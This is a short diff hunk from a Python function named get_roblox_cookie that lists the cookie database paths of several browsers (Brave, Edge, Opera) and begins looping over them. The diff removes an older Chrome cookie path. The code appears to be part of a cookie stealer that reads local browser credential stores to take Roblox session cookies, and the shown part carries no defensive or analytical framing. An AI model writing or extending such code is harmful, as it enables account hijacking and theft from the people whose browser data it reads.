@@ -114,7 +114,6 @@ def get_roblox_cookie():
         os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),
         os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
         os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable", "Cookies"),
-        os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Cookies"),
     ]
 
     for cookie_path in browser_cookie_paths:
